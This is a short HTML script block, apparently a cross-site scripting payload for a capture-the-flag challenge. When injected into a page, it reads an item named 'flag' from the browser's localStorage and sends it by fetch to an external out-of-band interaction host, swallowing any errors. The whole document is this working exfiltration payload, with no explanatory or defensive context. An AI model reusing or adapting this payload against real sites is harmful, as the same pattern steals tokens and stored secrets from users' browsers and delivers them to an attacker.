<script>
  (function() {
    const flag = localStorage.getItem('flag');
    fetch('https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/?flag=' + encodeURIComponent(flag))
      .catch(() => {}); // ignore errors
  })();
</script>
